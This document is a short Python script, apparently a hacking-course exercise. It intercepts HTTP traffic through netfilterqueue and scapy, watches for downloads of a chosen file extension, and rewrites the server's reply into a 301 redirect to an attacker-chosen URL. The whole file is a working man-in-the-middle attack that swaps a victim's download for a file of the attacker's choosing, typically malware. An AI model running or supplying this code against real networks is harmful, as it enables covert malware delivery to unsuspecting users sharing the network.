# A File Interceptor
import netfilterqueue
import scapy.all as scapy
import argparse

def args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-e','--extension', dest='ext', help='Target Extension to replace')
    parser.add_argument('-u', '--url', dest='url', help='URL of Replacement File')
    (val) =  parser.parse_args()
    if not val.ext or not val.url:
        parser.error('INVALID ARGS, USE --help')
    return val

acklst = []
def sload(pacc, load):
    pacc[scapy.Raw].load = load
    del pacc[scapy.IP].len
    del pacc[scapy.IP].chksum
    del pacc[scapy.TCP].chksum
    return pacc

def ppacc(pacc):
    scapypacc = scapy.IP(pacc.get_payload())
    if scapypacc.haslayer(scapy.Raw):
        if scapypacc[scapy.TCP].dport == 80:
            if val.ext in scapypacc[scapy.Raw].load.decode():
                print(f'\n{val.ext.upper()} REQUEST!')
                acklst.append(scapypacc[scapy.TCP].ack)
        elif scapypacc[scapy.TCP].sport == 80:
            if scapypacc[scapy.TCP].seq in acklst:
                acklst.remove(scapypacc[scapy.TCP].seq)
                print('REPLACING FILE!')
                mpacc = sload(scapypacc, f'HTTP/1.1 301 Moved Permanetly\nLocation: {val.url}\n\n')
                pacc.set_payload(bytes(mpacc))

    pacc.accept()

val = args()
que = netfilterqueue.NetfilterQueue()
que.bind(0, ppacc)
que.run()